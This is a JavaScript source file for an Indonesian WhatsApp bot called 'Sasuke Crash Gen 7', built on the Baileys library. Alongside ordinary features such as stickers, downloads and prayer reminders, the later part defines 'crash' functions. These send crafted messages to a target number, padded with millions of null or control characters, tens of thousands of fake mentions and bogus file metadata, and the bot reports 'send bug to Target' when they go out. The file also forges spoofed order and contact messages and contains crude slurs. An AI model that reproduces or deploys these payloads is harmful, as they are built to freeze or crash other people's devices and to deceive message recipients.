/*

 Base Sasuke Gen 7 Erlangga Official New Eraa!!🐉〽️
 Instagram : @errlngggaaa.rr
 Github : https://github.com/erlangga050809
 Telegram : t.me/langgxyz2
 
  ( don't delete the creator's name, please respect it!! )
  
            Kata Kata Hari Ini
      - "Bila kegagalan itu hujan, dan keberhasilan bagaikan matahari, maka butuh keduanya untuk melihat pelangi"
      
      - "Kesuksesan berawal dari misi dan tantangan, bukan berawal dari zona nyaman"
  
      ~Erlangga 12/04/2025
*/

require('../start/config');

const fs = require('fs');
const axios = require('axios');
const chalk = require("chalk");
const jimp = require("jimp")
const util = require("util");
const moment = require("moment-timezone");
const path = require("path")
const os = require('os')
const sharp = require('sharp')
const pino = require('pino');
const didyoumean = require('didyoumean');
const similarity = require('similarity');
const figlet = require('figlet');
const yts = require('yt-search');
const gradient = require('gradient-string');
const readline = require("readline");
const logger = pino({ level: 'debug' });
const JsConfuser = require("js-confuser");
const search = require("yt-search");
const { youtube } = require("btch-downloader");
const fetch = require('node-fetch');
const { GoogleGenerativeAI } = require ("@google/generative-ai");
const { Client } = require('ssh2');
const crypto = require('crypto');
const makeid = crypto.randomBytes(3).toString('hex')
const { Sticker } = require("wa-sticker-formatter");

const {
    spawn, 
    exec,
    execSync 
   } = require('child_process');
const { makeWAlanggxyzet, makeCacheableSignalKeyStore, downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate, generateWAMessageContent, generateWAMessage, makeInMemoryStore, prepareWAMessageMedia, generateWAMessageFromContent, MediaType, areJidsSameUser, WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, GroupMetadata, initInMemoryKeyStore, getContentType, MiscMessageGenerationOptions, useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, WAFlag, WANode, WAMetric, ChatModification, MessageTypeProto, WALocationMessage, ReconnectMode, WAContextInfo, proto, WAGroupMetadata, ProxyAgent, waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, MediaConnInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, WAMediaUpload, mentionedJid, processTime, Browser, MessageType, Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, GroupSettingChange, DisconnectReason, WAlanggxyzet, getStream, WAProto, isBaileys, PHONENUMBER_MCC, AnyMessageContent, useMultiFileAuthState, fetchLatestBaileysVersion, templateMessage, InteractiveMessage, Header } = require('@whiskeysockets/baileys')


module.exports = langgxyz = async (langgxyz, m, chatUpdate, store) => {
    try {
    if (global.db.data == null) await loadDatabase();
        require('../assest/schema')(m);

        const chats = global.db.data.chats[m.chat];
        const users = global.db.data.users[m.sender];
        const settings = global.db.data.settings;
        const body = (
            m.mtype === "conversation" ? m.message.conversation :
            m.mtype === "imageMessage" ? m.message.imageMessage.caption :
            m.mtype === "videoMessage" ? m.message.videoMessage.caption :
            m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
            m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
            m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
            m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
            m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
            m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
            m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : "");
        const content = JSON.stringify(m.message)
        
        const isText = ["extendedTextMessage", "conversation"].includes(m.mtype)
		const isImage = ["imageMessage"].includes(m.mtype)
		const isVideo = ["videoMessage"].includes(m.mtype)
		const isSticker = ["stickerMessage"].includes(m.mtype)
		const isAudio = ["audioMessage"].includes(m.mtype) && !(m.message[m.mtype]?.ptt)
		const isVoice = ["audioMessage"].includes(m.mtype) && !!(m.message[m.mtype]?.ptt)
		const isViewOnce = ["viewOnceMessageV2", "viewOnceMessage"].includes(m.mtype)
		const isContact = ["contactMessage", "contactsArrayMessage"].includes(m.mtype)
		const isLocation = ["locationMessage"].includes(m.mtype)
		const isDocument = ["documentMessage", "documentWithCaptionMessage"].includes(m.mtype)
		const isProtocol = ["protocolMessage"].includes(m.mtype)
		const isPollUpdate = ["pollUpdateMessage"].includes(m.mtype)
		const isPollCreation = ["pollCreationMessage"].includes(m.mtype)
		const isButtonList = ["interactiveResponseMessage"].includes(m.mtype)
		const isButtonReply = ["templateButtonReplyMessage"].includes(m.mtype)
		const isAllMedia = ["imageMessage", "videoMessage", "stickerMessage", "audioMessage", "viewOnceMessageV2", "viewOnceMessage", "contactMessage", "contactsArrayMessage", "locationMessage", "documentMessage", "documentWithCaptionMessage"].includes(m.mtype)
		const isQuotedViewOnce = m.mtype === "extendedTextMessage" && content.includes("viewOnceMessage")
 const getQuoted = (m.quoted || m)      
        const quoted = (getQuoted.type == 'buttonsMessage') ? getQuoted[Object.keys(getQuoted)[1]] : (getQuoted.type == 'templateMessage') ? getQuoted.hydratedTemplate[Object.keys(getQuoted.hydratedTemplate)[1]] : (getQuoted.type == 'product') ? getQuoted[Object.keys(getQuoted)[0]] : m.quoted ? m.quoted : m
        
        const sender = m.key.fromMe ? langgxyz.user.id.split(":")[0] + "@s.whatsapp.net" || langgxyz.user.id
: m.key.participant || m.key.remoteJid;
        
        const senderNumber = sender.split('@')[0];
        const budy = (typeof m.text === 'string' ? m.text : '');
        const prefa = global.prefa

        const prefixRegex = /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/;
        const prefix = prefixRegex.test(body) ? body.match(prefixRegex)[0] : ''
        const from = m.key.remoteJid;
        const isGroup = from.endsWith("@g.us");
        const premium = JSON.parse(fs.readFileSync("./assest/database/premium.json"))
        const creator = JSON.parse(fs.readFileSync('./assest/database/owner.json'))
        const botNumber = await langgxyz.decodeJid(langgxyz.user.id);
        const isPremium = premium.includes(m.sender)
        const isCmd = body.startsWith(prefix);
        const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
        const command2 = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1);
        const pushname = m.pushName || "No Name";
        const isCreator = [botNumber, ...creator, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const text = q = args.join(" ");
        const mime = (quoted.msg || quoted).mimetype || '';
        const qmsg = (quoted.msg || quoted);
        const isMedia = /image|video|sticker|audio/.test(mime);

        const groupMetadata = isGroup ? await langgxyz.groupMetadata(m.chat).catch((e) => {}) : "";
        const groupOwner = isGroup ? groupMetadata.owner : "";
        const groupName = m.isGroup ? groupMetadata.subject : "";
        const participants = isGroup ? await groupMetadata.participants : "";
        const groupAdmins = isGroup ? await participants.filter((v) => v.admin !== null).map((v) => v.id) : "";
        const groupMembers = isGroup ? groupMetadata.participants : "";
        const isGroupAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
        const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
        const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
        const isAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
        
            const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins } = require('../assest/myfunction');
        
const { pinterest, pinterest2, remini, mediafire, tiktokDl , spotifyDl , searchSpotifyTracks, convertDuration, convertAngka, ytdl, tiktokSearchVideo, delay, text2img, listModels, getModels, listSampler, pickRandom, getJobs, spotifyDown, rsz } = require('../assest/scraper');

 const {
imageToWebp, 
videoToWebp, 
writeExifImg, 
writeExifVid, 
writeExif, 
addExif 
} = require('../assest/exif')  

        if (m.message) {
            console.log('\x1b[30m--------------------\x1b[0m');
            console.log(chalk.bgHex("#e74c3c").bold(`▢ New Message`));
            console.log(
                chalk.bgHex("#00FF00").black(
                    `   --> Tanggal: ${new Date().toLocaleString()} \n` +
                    `   --> Pesan: ${m.body || m.mtype} \n` +
                    `   --> Pengirim: ${pushname} \n` +
                    `   --> JID: ${senderNumber}`
                )
            );
            
            if (m.isGroup) {
                console.log(
                    chalk.bgHex("#00FF00").black(
                        `   --> Grup: ${groupName} \n` +
                        `   --> GroupJid: ${m.chat}`
                    )
                );
            }
            console.log();
        }
        const reaction = async (jidss, emoji) => {
            langgxyz.sendMessage(jidss, {
                react: {
                    text: emoji,
                    key: m.key 
                } 
            })
        };
const imageUrls = [
        'https://files.catbox.moe/ggjkbc.jpg',
        'https://files.catbox.moe/ggjkbc.jpg',
        'https://files.catbox.moe/ggjkbc.jpg'
    ]; 
    
    // Randomized Image © Erlangga
    const randomIndex = Math.floor(Math.random() * imageUrls.length);
    const randomImageUrl = imageUrls[randomIndex];

function generateRandomNumber(min, max) {
return Math.floor(Math.random() * (max - min + 1)) + min;
}
        const createSerial = (size) => {
return crypto.randomBytes(size).toString('hex').slice(0, size)
}
//END       
        langgxyz.ments = async (text) => {
    return [m.sender];
};



  // Thumb Bot          
const cihuy = fs.readFileSync('./assest/allmedia/erlangga.jpg')
const marga = fs.readFileSync('./assest/allmedia/erlangga3.jpg')
const poto = fs.readFileSync('./assest/allmedia/erlangga2.jpg')

// Fake Qouted
const qmime = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `Erlangga Official`,jpegThumbnail: await rsz(poto, 200, 200) }}}


const erlangga = {
    key: {
        fromMe: false,
        participant: `0@s.whatsapp.net`,
        ...(m.chat ? { remoteJid: "status@broadcast" } : {}),
    },
    message: {
        productMessage: {
            product: {
                title: `Sasuke Crash Gen 7`,
                description: `${pushname} order`,
                currencyCode: "IDR",
                priceAmount1000: "1000000000000",
                retailerId: `Erlangga Official`,
                productImageCount: 1,
                productImage: {
                    mimetype: "image/jpeg",
                    jpegThumbnail: await getBuffer("https://files.catbox.moe/ggjkbc.jpg") // Ambil gambar sebagai buffer
                }
            },
            businessOwnerJid: `0@s.whatsapp.net`,
        },
    },
};
		
		const loli = {
  key: {
    fromMe: false,
    participant: "13135550002@s.whatsapp.net",
    remoteJid: "status@broadcast"
  },
  message: {
    orderMessage: {
      orderId: "2009",
      thumbnail: "https://files.catbox.moe/ggjkbc.jpg",
      itemCount: "9741",
      status: "INQUIRY",
      surface: "CATALOG",
      message: `Sender : @${m.sender.split('@')[0]}\nCommand : ${command}`,
      token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
    }
  },
  contextInfo: {
    mentionedJid: ["120363369514105242@s.whatsapp.net"],
    forwardingScore: 999,
    isForwarded: true,
  }
}

const PayX = {
			key: {
				fromMe: false,
				participant: `0@s.whatsapp.net`,
				...(from ? {
					remoteJid: "@s.whatsapp.net"
				} : {})
			},
			"message": {
				"orderMessage": {
					"orderId": "594071395007984",
					"thumbnail": fs.readFileSync('./assest/allmedia/erlangga2.jpg'),
					"thumbnailUrl": "https://files.catbox.moe/ggjkbc.jpg",
					"itemCount": 9741,
					"status": "INQUIRY",
					"surface": "CATALOG",
					"message": `Sender : @${pushname}\nCommand : ${command}`,
					"orderTitle": "© Erlangga Offcial",
					"sellerJid": "18002428478@s.whatsapp.net",
					"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
					"totalAmount1000": "9741",
					"totalCurrencyCode": "USD"
				}
			}
		}
		
		const qkontak = {
key: {
participant: `0@s.whatsapp.net`,
...(botNumber ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
'contactMessage': {
'displayName': `Sasuke Crash Gen 7`,
'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=6282137392620:+62 821-3739-2620\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
sendEphemeral: true
}}
}

const qchanel = {
key: {
remoteJid: 'status@broadcast',
fromMe: false,
participant: '0@s.whatsapp.net'
},
message: {
newsletterAdminInviteMessage: {
newsletterJid: `120363418898701072@newsletter`,
newsletterName: `Hore`,
jpegThumbnail: "",
caption: `Powered By Erlangga Official`,
inviteExpiration: Date.now() + 1814400000
}
}}
// total fitur
const totalFitur = () =>{
            var mytext = fs.readFileSync("../start/erlangga.js").toString()
            var numUpper = (mytext.match(/case '/g) || []).length;
            return numUpper
        }
        	
	// END
const ErlanggaReply = async (teks) => {
return langgxyz.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
externalAdReply: {
title: "Sasuke Crash Gen 7", 
body: `© Erlangga Developer`, 
thumbnailUrl: global.reply, 
sourceUrl: null, 
}}}, {quoted: PayX })
}

const Reply = async (teks) => {
return langgxyz.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
externalAdReply: {
title: "Sasuke Crash Gen 7", 
body: `© Erlangga Developer`, 
thumbnailUrl: global.reply, 
sourceUrl: null, 
}}}, {quoted: PayX })
}

const example = (teks) => {
return `\n *Example Command :*\n *${prefix+command}* ${teks}\n`
}

const nomerCreator =
[
'6282137382620@s.whatsapp.net',
'6288905301692@s.whatsapp.net'
] 
//debug
    async function SasukeDebug(Quoted){
    ErlanggaReply(`${JSON.stringify(Quoted, null, 2)}`)
    }

// Balasan Untuk Case Yang Tidak Sesuai
if (prefix && command) {
let caseNames = getCaseNames();
function getCaseNames() {
const fs = require('fs');
try {
const data = fs.readFileSync('./start/erlangga.js', 'utf8');
const casePattern = /case\s+'([^']+)'/g;
const matches = data.match(casePattern);
if (matches) {
const caseNames = matches.map(match => match.replace(/case\s+'([^']+)'/, '$1'));
return caseNames;
} else {
return [];
} } catch (err) {
console.log('Terjadi kesalahan:', err); //tangani Eror
return [];
}}
let noPrefix = command
let mean = didyoumean(noPrefix, caseNames);
let sim = similarity(noPrefix, mean);
let similarityPercentage = parseInt(sim * 100);
if (mean && noPrefix.toLowerCase() !== mean.toLowerCase()) {
let response = `▢ Halo Kak, Apakah kakak sedang mencari ${prefix+mean}?\n▢ Nama menu : ${prefix+mean}`
let buttons = [
        { buttonId: `${mean}`, buttonText: { displayText: `${mean}` } }
    ];

    let buttonMessage = {
        image: { 
            url: "https://files.catbox.moe/ggjkbc.jpg", 
            gifPlayback: true 
        },
        caption: response,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363409054020546@newsletter",
                newsletterName: `Channel Erlangga Developer ͤ͛`
            }
        },
        footer: "© Erlangga Official",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
    };
await langgxyz.sendMessage(m.chat, buttonMessage, { quoted: PayX });
}}
  
//Done Resp
async function doneress () {
if (!q) throw "Done Response"
let pepec = q.replace(/[^0-9]/g, "")
let ressdone = `
 𝚂𝚞𝚌𝚌𝚎𝚜 𝚜𝚎𝚗𝚍 𝚋𝚞𝚐 𝚝𝚘 𝚃𝚊𝚛𝚐𝚎𝚝!
*${command}* Sent To : 
 ${pepec}

⏳ 𝗣𝗹𝗲𝗮𝘀𝗲 𝗣𝗮𝘂𝘀𝗲 𝟱 𝗠𝗶𝗻𝘂𝘁𝗲𝘀🎭〽️` 

let buttons = [
        { buttonId: ".menu", buttonText: { displayText: "𝐁𝐚𝐜𝐤 𝐓𝐨 𝐦𝐞𝐧𝐮" } }
    ];

    let buttonMessage = {
        image: marga,
        caption: ressdone,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363409054020546@newsletter",
                newsletterName: "𝐂𝐡𝐚𝐧𝐧𝐞𝐥 𝐄𝐫𝐥𝐚𝐧𝐠𝐠𝐚"
            }
        },
        footer: "© Erlangga Developer",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
    };
await langgxyz.sendMessage(m.chat, buttonMessage, { quoted: qmime });
}     

// Database 
        if (chats.antilink) {
            if (budy.includes('chat.whatsapp.com')) {
                if (isAdmins || isCreator) return;
                ErlanggaReply(`GROUP LINK DETECTOR\n\nsepertinya kamu mengirimkan link grup, maaf, pesan tersebut saya hapus`);
                if (!isBotAdmins) return ErlanggaReply(`bot bukan admin`);
                let gclink = `https://chat.whatsapp.com/${await langgxyz.groupInviteCode(m.chat)}`;
                if (budy.includes(gclink)) return;
                await langgxyz.sendMessage(m.chat, {
                    delete: m.key
                });
            }
          }
          
// Owner Offf
//========= SETTING EVENT ========//
if (global.owneroff && !isCmd) {
if (!isGroup && !isCreator) {
let teks = `*Hai Sukicau😜* @${m.sender.split('@')[0]}

Sori Le *Owner Gua Sedang Offline*, Silahkan Lu Tunggu Dulu Aja Owner Kembali Online & Jangan Spam Chat Ya Anak Memek`
return langgxyz.sendMessage(m.chat, {text: `${teks}`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {
showAdAttribution: true, thumbnail: fs.readFileSync("./assest/allmedia/modeowner.jpg"), renderLargerThumbnail: false, title: "｢ OWNER OFFLINE MODE ｣", mediaUrl: linkgc, sourceUrl: linkyt, previewType: "PHOTO"}}}, {quoted: null})
}}
// FFUNC STIKER
function getRandomFile(ext) {
    return `${Math.floor(Math.random() * 10000)}${ext}`;
}
        
async function makeStickerFromUrl(imageUrl, langgxyz, m) {
    try {
        let buffer;
        if (imageUrl.startsWith("data:")) {
            const base64Data = imageUrl.split(",")[1];
            buffer = Buffer.from(base64Data, 'base64');
        } else {
            const response = await axios.get(imageUrl, { responseType: 'arraybuffer' });
            buffer = Buffer.from(response.data, "binary");
        }
        
        const webpBuffer = await sharp(buffer)
            .resize(512, 512, { fit: 'contain', background: { r: 255, g: 255, b: 255, alpha: 0 } })
            .webp({ quality: 70 })
            .toBuffer();
        
        const penis = await addExif(webpBuffer, global.packname, global.author)

        const fileName = getRandomFile(".webp");
        fs.writeFileSync(fileName, webpBuffer);

        await langgxyz.sendMessage(m.chat, {
            sticker: penis,
            contextInfo: {
                externalAdReply: {
                    showAdAttribution: true,
                    title: `Sasuke Crash`,
                    body: `Erlangga Developer `,
                    mediaType: 3,
                    renderLargerThumbnail: false,
                    thumbnailUrl: "https://files.catbox.moe/ggjkbc.jpg", 
                    sourceUrl: `https://t.me/langgxyz2`
                }
            }
        }, { quoted: qmime });

        fs.unlinkSync(fileName);
    } catch (error) {
        console.error("Error creating sticker:", error);
        ErlanggaReply('Terjadi kesalahan saat membuat stiker. Coba lagi nanti.');
    }
}

 async function tiktok2(query) {
  return new Promise(async (resolve, reject) => {
    try {
    const encodedParams = new URLSearchParams();
encodedParams.set('url', query);
encodedParams.set('hd', '1');

      const response = await axios({
        method: 'POST',
        url: 'https://tikwm.com/api/',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
          'Cookie': 'current_language=en',
          'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36'
        },
        data: encodedParams
      });
      const videos = response.data.data;
        const result = {
          title: videos.title,
          cover: videos.cover,
          origin_cover: videos.origin_cover,
          no_watermark: videos.play,
          watermark: videos.wmplay,
          music: videos.music
        };
        resolve(result);
    } catch (error) {
      reject(error);
    }
  });
}
 // Qc
 langgxyz.sendImageAsSticker = async (jid, path, quoted, options = {}) => {
let buff = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split`,`[1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
let buffer
if (options && (options.packname || options.author)) {
buffer = await writeExifImg(buff, options)
} else {
buffer = await imageToWebp(buff)
}
await langgxyz.sendMessage(jid, { sticker: { url: buffer }, ...options }, { quoted })
return buffer
}
let ppuser
           try {
           ppuser = await langgxyz.profilePictureUrl(m.sender, 'image')
           } catch (err) {
           ppuser = 'https://files.catbox.moe/ggjkbc.jpg'
           }
           
// FUNC HARI
        const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
const wib = moment.tz('Asia/Jakarta').format('HH : mm : ss')
const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')
const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')

const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
        if(time2 < "23:59:00"){
        var ucapanWaktu = 'ꜱᴇʟᴀᴍᴀᴛ ᴍᴀʟᴀᴍ️'
        }
        if(time2 < "19:00:00"){
        var ucapanWaktu = 'ꜱᴇʟᴀᴍᴀᴛ ᴘᴇᴛᴀɴɢ'
        }
        if(time2 < "18:00:00"){
        var ucapanWaktu = 'ꜱᴇʟᴀᴍᴀᴛ ꜱᴏʀᴇ'
        }
        if(time2 < "15:00:00"){
        var ucapanWaktu = 'ꜱᴇʟᴀᴍᴀᴛ ꜱɪᴀɴɢ️'
        }
        if(time2 < "10:00:00"){
        var ucapanWaktu = 'ꜱᴇʟᴀᴍᴀᴛ ᴘᴀɢɪ'
        }
        if(time2 < "05:00:00"){
        var ucapanWaktu = 'ꜱᴇʟᴀᴍᴀᴛ ꜱᴜʙᴜʜ'
        }
        if(time2 < "03:00:00"){
        var ucapanWaktu = 'ꜱᴇʟᴀᴍᴀᴛ ᴛᴇɴɢᴀʜ ᴍᴀʟᴀᴍ'
        }
// Auto Sholat
langgxyz.autoshalat = langgxyz.autoshalat ? langgxyz.autoshalat : {}
	let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? langgxyz.user.id : m.sender
	let id = m.chat 
    if(id in langgxyz.autoshalat) {
    return false
    }
    let jadwalSholat = {
    shubuh: '04:50',
    terbit: '05:44',
    dhuha: '06:02',
    dzuhur: '12:02',
    ashar: '15:15',
    magrib: '18:16',
    isya: '19:27',
    }
    const datek = new Date((new Date).toLocaleString("en-US", {
    timeZone: "Asia/Jakarta"  
    }));
    const hours = datek.getHours();
    const minutes = datek.getMinutes();
    const timeNow = `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}`
    for(let [sholat, waktu] of Object.entries(jadwalSholat)) {
    if(timeNow === waktu) {
    let caption = `Hai kak 👋${pushname},\nWaktu *${sholat}* telah tiba, ambilah air wudhu dan segeralah shalat🙂.\n\n*${waktu}*\n_untuk wilayah Makassar dan sekitarnya._`
    langgxyz.autoshalat[id] = [
    ErlanggaReply(caption),
    setTimeout(async () => {
    delete langgxyz.autoshalat[m.chat]
    }, 57000)
    ]
    }
    }        
//end  
    async function VampSpam(langgxyz, target) {
  try {
    let message = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: [target],
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: target,
              },
            },
            body: {
              text: "Sasuke Crash 🐍 🐍 Here",
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
              ],
            },
          },
        },
      },
    };

    await langgxyz.relayMessage(target, message, {
      participant: { jid: target },
    });
  } catch (err) {
    console.log(err);
  }
}
async function VampDeviceCrash(langgxyz, target) {
    await langgxyz.relayMessage(number, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "Hi...I'm Sasuke Crash 🐍",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\u0000".repeat(1000000),
                        version: 3
                    }
                }
            }
        }
    }, { participant: { jid: target}});
}

async function VampPaymentCrash(target, Ptcp = true) {
    await langgxyz.relayMessage(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "Sasuke.biz.net",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "payment_transaction_request",
                        paramsJson: "\u0003".repeat(1000000),
                        version: 3
                    }
                }
            }
        }
    }, { participant: { jid: target }});
}

async function VampDelayMess(langgxyz, target) {
    const message = {
        ephemeralMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                            mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                            fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                            fileLength: "9999999999999",
                            pageCount: 1316134911,
                            mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                            fileName: "xnxxx.com",
                            fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                            directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1726867151",
                            contactVcard: true,
                            jpegThumbnail: ""
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "Sasuke Crash 🐍 🐍 Is Back\n" + "@062598121203".repeat(17000)
                    },
                    nativeFlowMessage: {
                        buttons: [{
                            name: "cta_url",
                            buttonParamsJson: "{ display_text: 'Sasuke Crash 🐍 🐍 Bot', url: \"https://youtube.com/@iqbhalkeifer25\", merchant_url: \"https://youtube.com/@iqbhalkeifer25\" }"
                        }, {
                            name: "call_permission_request",
                            buttonParamsJson: "{}"
                        }],
                        messageParamsJson: "{}"
                    },
                    contextInfo: {
                        mentionedJid: ["15056662003@s.whatsapp.net", ...Array.from({
                            length: 30000
                        }, () => "1" + Math.floor(Math.random() * 700000) + "@s.whatsapp.net")],
                        forwardingScore: 1,
                        isForwarded: true,
                        fromMe: false,
                        participant: "0@s.whatsapp.net",
                        remoteJid: "status@broadcast",
                        quotedMessage: {
                            documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                                fileLength: "9999999999999",
                                pageCount: 1316134911,
                                mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                                fileName: "xvideos.com",
                                fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                                directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1724474503",
                                contactVcard: true,
                                thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                                thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                                thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                                jpegThumbnail: ""
                            }
                        }
                    }
                }
            }
        }
    };

    await langgxyz.relayMessage(target, message, {
        participant: { jid: target }
    });
}

async function VampPrivateBlank(langgxyz, target) {
  const Vampire = `_*~@2~*_\n`.repeat(10500);
  const Private = 'ꦽ'.repeat(5000);

  const message = {
    ephemeralMessage: {
      message: {
        interactiveMessage: {
          header: {
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
              mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
              fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
              fileLength: "9999999999999",
              pageCount: 1316134911,
              mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
              fileName: "Pembasmi Kontol",
              fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
              directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1726867151",
              contactVcard: true,
              jpegThumbnail: null,
            },
            hasMediaAttachment: true,
          },
          body: {
            text: 'Sasuke Crash 🐍 🐍 Blank!' + Vampire + Private,
          },
          footer: {
            text: '',
